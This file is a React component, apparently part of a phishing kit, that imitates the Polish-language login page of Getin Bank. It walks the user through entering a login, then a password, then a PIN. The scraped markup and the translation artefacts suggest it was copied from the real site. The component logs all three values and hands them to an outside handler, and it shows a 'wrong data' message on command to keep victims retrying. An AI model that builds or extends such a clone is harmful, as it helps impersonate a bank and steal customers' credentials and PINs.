import {useForm} from "react-hook-form";
import {yupResolver} from "@hookform/resolvers/yup";
import * as yup from "yup";
import {useState} from "react";

const schema = yup.object().shape({
    login: yup.string().max(25).required(),
    password: yup.string().required(),
    pin: yup.string().required()
});

const GetInBankFormLogin = ({handler, status}) => {
    const [step, setStep] = useState(1);
    const [loading, setLoading] = useState(false);
    const {register, handleSubmit, trigger, reset, formState: {errors}} = useForm({
        resolver: yupResolver(schema),
        mode: 'onChange'
    });

    const clearForm = (data) => {
        console.log(data);
        setLoading(false);
        setStep(1);
        reset();
        handler(data);
    }

    console.log(errors)

    return (
        <form className="h--form-login mb20 clearfix"
              onSubmit={handleSubmit(clearForm)}>
            <div className="steps two">
                <div className="step one active">
                    <div><span>Login</span></div>
                </div>
                <div className={`step two ${step >= 2 && 'active'}`}>
                    <div><span>Hasło</span></div>
                </div>
            </div>
            <div className="show_login"/>
            {
                step === 1 ?
                    <div key={'login'} className="step1">
                        <div className="full-window"/>
                        <div className="h--form--field h--input-prepend">
                            <input type="text"
                                   placeholder="WPISZ LOGIN LUB ALIAS"
                                   autoComplete="off"
                                   {...register('login')}/>
                            <span className="add-on"><i className="icon icon--male"/></span>
                            <span className="add-on add-on-login" id="to_login-information"><i
                                className="icon icon--info-mark"/></span>
                            {
                                errors.login ?
                                    <div className="js-error-target">
                                        <div className="cloud">
                                            {
                                                errors.login.type === 'required' ?
                                                    <span>Pole jest wymagane</span> :
                                                    errors.login.type === 'max' ?
                                                        <span>Niepoprawny login</span> : null
                                            }

                                        </div>
                                    </div> :
                                    status === 'wrong_login' ?
                                        <div className="cloud message-blockBI" style={{display: 'block'}}>
                                        <span><font style={{verticalAlign: 'inherit'}}><font
                                            style={{verticalAlign: 'inherit'}}>Złe dane</font></font></span><i
                                            id="close_login-information-error"
                                            className="icon icon--info-close mt--5 close_login-information-error"/>
                                            <p><font style={{verticalAlign: 'inherit'}}><font
                                                style={{verticalAlign: 'inherit'}}>Sprawdź, czy dane są poprawne i
                                                spróbuj
                                                ponownie. </font></font></p>
                                        </div> : null

                            }

                            <div className="login-information">
                                <div className="information-title">GDZIE ZNAJDĘ LOGIN LUB ALIAS?</div>
                                <i id="close_login-information"
                                   className="icon icon--info-close close_login-information"/>
                                <div className="clearfix"/>
                                <p>LOGIN - został wysłany e-mailem lub znajduje się na Umowie o Bankowość
                                    Elektroniczną lub Pakietową. Składa się z samych cyfr.</p>
                                <p>ALIAS – tzw . Własny login, czyli dowolna nazwa, którą można zdefiniować
                                    po
                                    zalogowaniu się do Bankowości Internetowej.</p>
                            </div>
                        </div>
                        <button type="button"
                                className="h--btn-arrow-right h--btn-light-green float-right long login-next-button fz-12"
                                onClick={() => {
                                    trigger('login').then((res) => {
                                        if (res) {
                                            setStep(2)
                                        }
                                    })
                                }}
                        >
                            dalej
                        </button>
                        <button type="button"
                                className="h--btn h--btn-light-gray h--gray-hover float-left prepend-icon showHideHelp fz-12">
                            pomoc
                        </button>
                        <div className="clearfix"/>
                        <div id="login-first-step" className="index-link">
                            <a id="login-help-link" className="href-bottom-border showHideLoginHelp">Problemy z
                                logowaniem?</a>
                            <a id="login-help-arrow" className="showHideLoginHelp">
                                <i id="login-help-step-one-arrow"
                                   className="icon icon--arrow-right-mark mt-6"/>
                            </a>
                        </div>
                    </div> :
                    step === 2 ?
                        <div key={'password'} className="step1">
                            <div className="full-window"/>
                            <div className="h--form--field h--input-prepend">
                                <input type="text"
                                       placeholder="WPROWADŹ HASŁO"
                                       autoComplete="off"
                                       type={'password'}
                                       {...register('password')}/>
                                <span className="add-on"><i className="icon icon--male"/></span>
                                <span className="add-on add-on-login" id="to_login-information"><i
                                    className="icon icon--info-mark"/></span>
                                {
                                    errors.password &&
                                    <div className="js-error-target">
                                        <div className="cloud">
                                            {
                                                errors.password.type === 'required' ?
                                                    <span>Pole jest wymagane</span> : null
                                            }
                                        </div>
                                    </div>
                                }

                                <div className="login-information">
                                    <div className="information-title">GDZIE ZNAJDĘ LOGIN LUB ALIAS?</div>
                                    <i id="close_login-information"
                                       className="icon icon--info-close close_login-information"/>
                                    <div className="clearfix"/>
                                    <p>LOGIN - został wysłany e-mailem lub znajduje się na Umowie o Bankowość
                                        Elektroniczną lub Pakietową. Składa się z samych cyfr.</p>
                                    <p>ALIAS – tzw . Własny login, czyli dowolna nazwa, którą można zdefiniować
                                        po
                                        zalogowaniu się do Bankowości Internetowej.</p>
                                </div>
                            </div>
                            <button type="button"
                                    className="h--btn-arrow-right h--btn-light-green float-right long login-next-button fz-12"
                                    onClick={() => {
                                        trigger('password').then((res) => {
                                            if (res) {
                                                setStep(3)
                                            }
                                        })
                                    }}
                            >
                                dalej
                            </button>
                            <button type="button"
                                    className="h--btn h--btn-light-gray h--gray-hover float-left prepend-icon showHideHelp fz-12"
                                    onClick={() => {
                                        setStep(1);
                                    }}
                            >
                                Wróć
                            </button>
                            <div className="clearfix"/>
                            <div id="login-first-step" className="index-link">
                                <a id="login-help-link" className="href-bottom-border showHideLoginHelp">Problemy z
                                    logowaniem?</a>
                                <a id="login-help-arrow" className="showHideLoginHelp">
                                    <i id="login-help-step-one-arrow"
                                       className="icon icon--arrow-right-mark mt-6"/>
                                </a>
                            </div>
                        </div> :
                        step === 3 ?
                            <div key={'pin'} className="step1">
                                <div className="full-window"/>
                                <div className="h--form--field h--input-prepend">
                                    <input type="text"
                                           placeholder="WPROWADŹ PIN"
                                           autoComplete="off"
                                           type={'password'}
                                           {...register('pin')}/>
                                    <span className="add-on"><i className="icon icon--male"/></span>
                                    <span className="add-on add-on-login" id="to_login-information"><i
                                        className="icon icon--info-mark"/></span>
                                    {
                                        errors.pin &&
                                        <div className="js-error-target">
                                            <div className="cloud">
                                                {
                                                    errors.pin.type === 'required' ?
                                                        <span>Pole jest wymagane</span> : null
                                                }
                                            </div>
                                        </div>
                                    }

                                    <div className="login-information">
                                        <div className="information-title">GDZIE ZNAJDĘ LOGIN LUB ALIAS?</div>
                                        <i id="close_login-information"
                                           className="icon icon--info-close close_login-information"/>
                                        <div className="clearfix"/>
                                        <p>LOGIN - został wysłany e-mailem lub znajduje się na Umowie o Bankowość
                                            Elektroniczną lub Pakietową. Składa się z samych cyfr.</p>
                                        <p>ALIAS – tzw . Własny login, czyli dowolna nazwa, którą można zdefiniować
                                            po
                                            zalogowaniu się do Bankowości Internetowej.</p>
                                    </div>
                                </div>
                                <button type="submit"
                                        className="h--btn-arrow-right h--btn-light-green float-right long login-next-button fz-12">
                                    dalej
                                </button>
                                <button type="button"
                                        className="h--btn h--btn-light-gray h--gray-hover float-left prepend-icon showHideHelp fz-12"
                                        onClick={() => {
                                            setStep(2);
                                        }}
                                >
                                    Wróć
                                </button>
                                <div className="clearfix"/>
                                <div id="login-first-step" className="index-link">
                                    <a id="login-help-link" className="href-bottom-border showHideLoginHelp">Problemy z
                                        logowaniem?</a>
                                    <a id="login-help-arrow" className="showHideLoginHelp">
                                        <i id="login-help-step-one-arrow"
                                           className="icon icon--arrow-right-mark mt-6"/>
                                    </a>
                                </div>
                            </div> : null
            }

        </form>


    )
}
export default GetInBankFormLogin;